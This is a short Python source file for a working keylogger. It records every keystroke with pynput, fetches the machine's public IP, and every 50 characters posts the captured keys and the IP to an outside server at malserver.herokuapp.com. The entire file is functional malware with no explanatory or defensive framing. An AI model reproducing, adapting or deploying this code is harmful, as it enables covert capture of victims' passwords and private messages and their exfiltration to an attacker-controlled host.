from pynput.keyboard import Listener
import requests
URL = 'https://malserver.herokuapp.com/'
IP = requests.get("https://api.ipify.org").text
DATA = ''
def send():
    global DATA
    try:
        requests.post(URL,data={'sign':"#",'ip':IP,'log':DATA})
    except:
        return
def on_press(key):
    global DATA
    key = str(key)
    if key[0] == "'" and key[-1] == "'":
        key = key[1:-1]
    DATA+=key
    if len(DATA) >= 50:
        send()
        DATA = ''
    else:
        DATA+=","
with Listener(on_press=on_press) as listener:
    listener.join()
